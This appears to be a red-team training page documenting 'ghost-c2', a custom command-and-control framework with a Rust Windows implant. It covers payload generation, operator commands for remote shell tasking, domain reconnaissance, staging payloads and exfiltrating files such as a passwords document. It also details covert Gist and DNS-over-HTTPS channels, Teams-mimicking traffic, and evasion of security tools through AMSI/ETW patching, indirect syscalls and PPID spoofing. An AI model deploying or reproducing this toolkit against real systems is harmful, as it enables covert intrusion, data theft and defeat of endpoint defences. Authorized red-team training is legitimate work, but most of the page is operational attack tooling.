---
layout: training-page
title: "ghost-c2 — Custom C2 Framework — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - rust
  - implant
  - evasion
  - opsec
  - dead-drop
  - custom-c2
page_key: "c2-ghost-c2"
render_with_liquid: false
---

# ghost-c2 — Custom C2 Framework

ghost-c2 is a custom red team C2 framework with a Rust agent, Go team server, and Python operator CLI. It is designed around operational security: indirect syscalls (Hell's Gate), Ekko obfuscated sleep, PPID spoofing, and three distinct communication channels (primary HTTPS, GitHub Gist dead-drop, DNS-over-HTTPS fallback). The agent compiles to a Windows x64 PE with no runtime dependencies.

> **Authorized use only.** Deploy only against systems you are explicitly authorized to test.

## Architecture

```
  OPERATOR WORKSTATION
  ┌──────────────────┐    HTTP (127.0.0.1:8080)
  │  operator CLI    │◄──────────────────────────────────────┐
  │  (Python)        │                                       │
  └──────────────────┘                                       │
                                                             │
  TEAM SERVER                                                │
  ┌───────────────────────────────┐                          │
  │  Agent Listener (HTTPS :443)  │                          │
  │  - /checkin                   │◄─────────────────────────┘
  │  - /task  (poll)              │  Operator API (REST, auth-gated)
  │  - /result                    │
  └──────────────┬────────────────┘
                 │ SQLite
  ┌──────────────▼────────────────┐
  │  ghost.db  (agents + tasks)   │
  └───────────────────────────────┘
                 │ HTTPS (TLS 1.3, WinHTTP/SChannel)
  AGENT (Windows x64 PE)
  ┌──────────────────────────────────────┐
  │  - Ekko obfuscated sleep             │
  │  - Hell's Gate indirect syscalls     │
  │  - PPID spoofing (explorer.exe)      │
  │  - AMSI/ETW patch                    │
  │  - Reflective DLL loader             │
  │                                      │
  │  Fallback 1: GitHub Gist dead-drop   │──► api.github.com (HTTPS)
  │  Fallback 2: DoH (Cloudflare 1.1.1.1)│──► 1.1.1.1:443
  └──────────────────────────────────────┘
```

### Channel Priority

| Priority | Channel | Trigger |
|----------|---------|---------|
| 1 | Primary HTTPS (team server) | Every beacon interval |
| 2 | GitHub Gist dead-drop | After 3 consecutive primary failures, or every `gist_sleep` interval |
| 3 | DNS-over-HTTPS (Cloudflare) | Primary fails ≥3 AND Gist not configured |

## Prerequisites

### Team Server (Go)

```
go version  # must be 1.21+
```

### Agent Builder (Rust cross-compile)

```
rustup target add x86_64-pc-windows-gnu

# Debian/Ubuntu linker:
sudo apt install gcc-mingw-w64-x86-64
```

### Operator CLI (Python)

```
cd operator/
pip install -r requirements.txt
# requirements: click, requests, tabulate
```

## Quick Start (Docker)

```
# Step 1 — generate TLS cert and config
mkdir -p certs/
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/key.pem -out certs/cert.pem \
  -days 365 -nodes -subj "/CN=your-c2-domain.com"
cp config.toml.example config.toml
# Edit config.toml: listener.host, operator.password, db_path

# Step 2 — build and start
docker compose up -d --build
docker compose logs -f ghost-c2
# Expected:
#   [*] agent listener: https://0.0.0.0:443
#   [*] operator API: http://0.0.0.0:8080

# Step 3 — install operator CLI
cd operator/
pip install -r requirements.txt
export GHOST_HOST=127.0.0.1
export GHOST_PORT=8080
export GHOST_PASSWORD="your-password"
alias ghost="python $(pwd)/operator.py"
```

## Server Configuration (`config.toml`)

```
[listener]
host      = "0.0.0.0"
port      = 443
cert_path = "/etc/ghost/cert.pem"
key_path  = "/etc/ghost/key.pem"

[operator]
host     = "127.0.0.1"   # bind to loopback — never expose port 8080
port     = 8080
password = "your-strong-password-here"

db_path  = "/var/ghost/ghost.db"

[profile]
uri_checkin = "/api/v1/users/me/activity"
uri_task    = "/api/v1/teams/notify/sync"
uri_result  = "/api/v1/telemetry/events"

user_agents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...",
]

[profile.headers]
"X-MS-Client-Type" = "web"
"Origin"           = "https://teams.microsoft.com"
"Referer"          = "https://teams.microsoft.com/"
```

## Payload Generation

The generator configures and cross-compiles a fresh Rust agent. Each run produces a unique UUID baked into the binary.

```
cd generator/
python generate.py \
  --host c2.example.com \
  --port 443 \
  --sleep 60 \
  --jitter 20 \
  --kill 2026-12-31 \
  --profile ../profiles/teams-mimicry.toml \
  --output /tmp/ghost.exe
```

### All Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--host` | required | C2 team server hostname or IP |
| `--port` | `443` | C2 listener port |
| `--sleep` | `60` | Beacon interval in seconds |
| `--jitter` | `20` | Sleep jitter as a percentage (0–50) |
| `--kill` | `2026-12-31` | Kill date `YYYY-MM-DD`; agent calls `ExitProcess(0)` after |
| `--profile` | — | Path to listener TOML profile |
| `--output` | required | Output path for the compiled PE |
| `--task-gist` | — | GitHub Gist ID for incoming tasks (dead-drop) |
| `--result-gist` | — | GitHub Gist ID for outgoing results |
| `--gist-token` | — | GitHub PAT with `gist` scope |
| `--gist-sleep` | `300` | Gist poll interval in seconds |
| `--doh-domain` | — | Domain for DoH fallback channel |

### What the Generator Does

1. Generates a fresh UUID for this agent instance
2. Merges CLI args with the TOML profile into a config dict
3. XOR-encodes config JSON and writes `agent/config.bin` (key: `0x5A`)
4. Runs `cargo build --release --target x86_64-pc-windows-gnu`
5. Strips PE metadata: zeros `TimeDateStamp`, zeros the debug directory size
6. Copies binary to `--output` and prints SHA-256 hash

> First build takes 5–10 minutes while Cargo compiles. Subsequent builds are cached and take under 30 seconds.

## Operator CLI

### Environment Variables

```
export GHOST_HOST=127.0.0.1
export GHOST_PORT=8080
export GHOST_PASSWORD=yourpasswd

# SSH tunnel for remote operator access:
ssh -L 8080:127.0.0.1:8080 user@team-server -N &
```

### `agents` — List Active Agents

```
ghost agents

# Output columns: ID | Hostname | User | OS | Arch | PID | Sleep | Last Seen | Status
# Status: online (recent beacon) | stale (missed beacons) | dead (long absent)
```

### `task` — Queue a Command

```
ghost task AGENT_ID COMMAND

# Examples:
ghost task a1b2c3d4 "shell:whoami"
ghost task a1b2c3d4 "shell:ipconfig /all"
ghost task a1b2c3d4 "shell:net user /domain"
ghost task a1b2c3d4 die
```

### `tasks` — View Task Results

```
ghost tasks AGENT_ID           # completed tasks only
ghost tasks AGENT_ID --all     # include pending and sent
```

### `wait` — Block for Task Result

```
ghost task a1b2c3d4 "shell:ipconfig /all"
# [+] Task queued: 7f8e9d0c-...

ghost wait a1b2c3d4 7f8e9d0c --timeout 180
# Polls every 10s; prints output when complete
```

### `upload` — Stage a File

```
ghost upload a1b2c3d4 /tmp/tool.exe --staging-url https://cdn.example.com/drops
# Queues a task to download from the URL on next beacon
```

### `download` — Exfiltrate a File

```
ghost download a1b2c3d4 "C:\Users\jsmith\Documents\passwords.txt"
# Binary files: use certutil -encode first
ghost task a1b2c3d4 "shell:certutil -encode C:\file.bin C:\file.b64"
```

### `gist setup` — Create Dead-Drop Pair

```
ghost gist setup --token ghp_xxxxxxxxxxxxxxxxxxxx
# [+] Task Gist ID:   abc123def456789
# [+] Result Gist ID: 987654321fedcba
# Pass these to generate with --task-gist and --result-gist
```

## Task Command Reference

Tasks are raw strings stored in the database and delivered to the agent encrypted.

### `shell:<command>`

Runs `<command>` via `cmd.exe /C <command>` with PPID spoofing and `CREATE_NO_WINDOW`.

```
shell:whoami
shell:whoami /all
shell:hostname
shell:ipconfig /all
shell:net user /domain
shell:net group "Domain Admins" /domain
shell:netstat -ano
shell:tasklist /v
shell:systeminfo
shell:reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
shell:powershell -enc <base64_command>
shell:certutil -encode C:\path\to\file C:\path\to\file.b64
```

### `die`

Calls `ExitProcess(0)` immediately. Agent terminates; no result is returned. Irreversible — generate a new payload to re-establish access.

## Fallback Channels

### GitHub Gist Dead-Drop

Uses two private GitHub Gists as shared clipboards: one for incoming tasks, one for outgoing results.

```
python generate.py \
  --host c2.example.com \
  --task-gist   abc123def456789  \
  --result-gist 987654321fedcba  \
  --gist-token  ghp_xxxxxxxxxxxxxxxxxxxx \
  --gist-sleep  300 \
  --output /tmp/ghost_gist.exe
```

- Agent polls task Gist every `gist_sleep` seconds (default: 5 min)
- Activates immediately after 3 consecutive primary failures
- Task/result content is AES-256-GCM encrypted, base64-encoded
- Traffic goes to `api.github.com` over HTTPS — blends with developer activity

### DNS-over-HTTPS Fallback

Queries Cloudflare's DoH resolver (`1.1.1.1`) for TXT records containing encrypted commands.

```
python generate.py \
  --host c2.example.com \
  --doh-domain fallback.example.com \
  --output /tmp/ghost_doh.exe
```

The agent queries: `{agent_uuid_b64_prefix}.beacon.{doh_domain}`

To deliver a command: AES-256-GCM encrypt the command string with the agent's key, base64-encode it, set as a TXT record with TTL 60s. Activates only when primary HTTPS fails ≥3 beacons AND no Gist is configured.

## Listener Profiles

Profiles are TOML files controlling URI paths, user-agent strings, and HTTP headers. The included `profiles/teams-mimicry.toml` mimics Microsoft Teams / M365 API traffic:

- URIs: `/api/v1/users/me/activity`, `/api/v1/teams/notify/sync`, `/api/v1/telemetry/events`
- Headers: `X-MS-Client-Type: web`, `Origin: https://teams.microsoft.com`
- Four realistic browser user-agent strings

```
# Use a profile with the generator:
python generate.py --host c2.example.com --profile ../profiles/teams-mimicry.toml --output ...
```

The `uri_*` paths in the profile **must exactly match** the server's `[profile]` section — mismatch causes agents to POST to 404 and never check in.

## OPSEC Notes

### Transport

- **TLS 1.3 enforced** on the agent listener
- Agent uses **WinHTTP/SChannel** — TLS fingerprint matches any native Windows application, not Rust's rustls (which has a detectable JA3/JA4)
- Use a CA-signed certificate; self-signed certs trigger `SECURITY_FLAG_IGNORE_CERT_CN_INVALID` that some EDR products flag

### Process Behavior

- **PPID spoofing**: `shell:` tasks are spawned as children of `explorer.exe` — appear as user-initiated in EDR telemetry
- **No window**: `CREATE_NO_WINDOW` on all child processes
- **Ekko sleep**: heap memory is AES-encrypted during sleep; call stack is spoofed before the sleep syscall — reduces memory scan hits on sleeping agents

### Indirect Syscalls (Hell's Gate)

AMSI/ETW patches and process injection use `NtProtectVirtualMemory`, `NtWriteVirtualMemory`, `NtAllocateVirtualMemory`, `NtCreateThreadEx`, and `NtOpenProcess` — all resolved via SSN extraction from `ntdll.dll` on disk, called through an `ntdll` gadget (`syscall; ret`). No hooked Win32 API functions are called.

### Memory Permissions

Memory is allocated RW → written → transitioned to RX via two separate `NtProtectVirtualMemory` calls. `PAGE_EXECUTE_READWRITE` is never used.

### AMSI / ETW Patches

Both are patched in-process at startup using indirect syscalls:

1. `NtProtectVirtualMemory` grants RW on the target function
2. `NtWriteVirtualMemory` writes the patch bytes
3. Permissions restored to RX

### PE Metadata

- Generator zeros `TimeDateStamp` in the COFF header and debug directory size
- `llvm-objcopy --strip-debug` removes debug sections if available
- No PDB path in mingw cross-compile builds

### Kill Date

Always set `--kill` to match the authorized engagement window. The agent checks `GetSystemTime()` on every beacon.

## Resources

- ghost-c2 source — `~/code-server/projects/ghost-c2/`
- OPERATOR.md — full operator reference in the repo
- [Hell's Gate](https://github.com/am0nsec/HellsGate) — original indirect syscall technique
- [Ekko sleep obfuscation](https://github.com/crummie5/Ekko) — Rust implementation reference
